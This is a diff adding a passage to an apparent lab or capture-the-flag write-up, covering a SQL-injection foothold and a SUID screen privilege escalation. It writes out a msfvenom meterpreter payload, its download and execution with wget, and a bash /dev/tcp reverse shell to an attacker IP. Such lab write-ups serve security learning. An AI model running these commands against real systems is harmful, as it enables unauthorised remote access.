@@ -382,4 +382,36 @@ find / -perm 4000 -type f 2>/dev/null
 # nothing.
 ```
 
+We're running in an unstable terminal piped through MySQL... Let's use `msfvenom` and `python3 -m http.server` to get a proper reverse shell.
+
+```sh
+ip a | grep 192 # get attacker ip = 192.168.49.53
+
+# gen payload
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.53 LPORT=4444 -f elf -o shell.elf
+
+# serve payload
+python3 -m http.server 80
+
+# start nc listener
+nc -nvlp 4444
+
+# download and execute payload in victim rev shell
+cd /dev/shm
+wget http://192.168.49.53:80/shell.elf
+chmod +x shell.elf
+./shell.elf
+# fails. cannot execute. let's try something else.
+
+sh -i >& /dev/tcp/192.168.49.53/4444 0>&1
+# works, but our shell is still unstable. let's move on.
+```
+
+I'm re-reading the description of the lab for clues.
+
+>In this lab, we will exploit a vulnerable web server via SQL Injection that allows access to a PHP eval function. We will then identify a vulnerable setuid Screen binary and modify the privilege escalation exploit to suit the target environment.
+
+SUID `screen` binary...Dang.
+
+If our shell is unstable, `screen` dies. I might want to research how to stabilize it later, tomorrow morning.
 ## Root access
